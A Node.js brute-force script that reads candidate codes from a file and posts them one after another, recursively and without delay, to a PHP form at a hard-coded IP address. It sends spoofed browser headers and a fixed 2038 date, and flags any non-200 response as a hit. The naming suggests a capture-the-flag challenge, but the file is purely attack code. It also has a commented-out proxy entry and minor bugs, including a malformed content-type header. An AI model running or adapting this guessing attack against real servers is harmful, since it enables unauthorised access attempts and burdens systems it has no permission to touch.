const axios = require("axios");
const fs = require("fs");


var data = fs.readFileSync("codes.txt", "utf8").replace(/\r\n/g, "\n").split("\n");


// const chunk1
// const chunk1
// const chunk1
// const chunk1

const config = {
	headers: {
		"Content-Type": "application/c-www-form-urlencoded",
		"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
		"accept-encoding": "gzip, deflate",
		referer: "http://46.101.134.129/epoch/",
		accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
		"content-type": "application/x-www-form-urlencoded",
		dnt: "1",
		"upgrade-insecure-requests": "1",
		origin: "http://46.101.134.129",
		"cache-control": "no-cache",
		"content-length": "24",
		connection: "keep-alive",
		host: "46.101.134.129",
	},
	// 	proxy: {
    //     host: 'proxy02.uniswa.sz',
    //     port: 3128,
    // },
};
let url = "http://46.101.134.129/epoch/epoch-a-lyptic.php";

 const makeReqest = async() => {
	 try{
		 let params = new URLSearchParams();
	let e = data.pop();
	params.append("code", e);
	params.append("date", "2038-01-19");
	return await	axios
			.post(url, params, config)
			.then((res) => {
				console.log("-------------------------------------");
				console.log(`statusCode: ${res.status}`);
				console.log(`code : ${e}`);

				console.log("data : " + data.length);
				console.log("-------------------------------------");

				if (res.status !== 200) {
					console.log("found : " + e);
					console.log(res.data);
				}
				// makeReqest();
				// resolve(res);
			})
	
	 }catch(Error){
		 return Error;
	 }
	
}

// console.log(data)
// async makeReqest(CODE){

//     await   axios.post(url, params, config)
//     console.log('-------------------------------------')
//     console.log(`statusCode: ${res.status}`);
//     console.log(`code : ${CODE}`);
//     console.log('-------------------------------------☻')
//     console.log("found : "+e)
//     console.log(res.data);

// }
function Recusive() {
	makeReqest().then((res) => {
		Recusive();
	});
}

Recusive();
 